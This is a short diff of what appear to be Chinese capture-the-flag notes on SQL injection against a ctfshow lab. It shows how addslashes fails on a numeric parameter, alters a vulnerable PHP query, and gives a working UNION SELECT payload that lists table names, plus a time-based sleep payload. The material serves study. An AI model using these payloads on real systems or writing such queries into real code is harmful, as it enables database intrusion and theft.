@@ -98,7 +98,7 @@ or sleep(3)--+
 如果是数值传参，直接不传入"和\即可绕过：
 ```
 addslashes($id);
-$res = $conn->query("SELECT `username` FROM ctfshow_users WHERE id = {$id}");
+$res = $conn->query("SELECT `username` FROM ctfshow_users WHERE id = ($id)");
 
 ?id=222)%20union%20select%20group_concat(table_name)%20from%20mysql.innodb_table_stats%20where%20database_name%20=%20database()%23
 ```
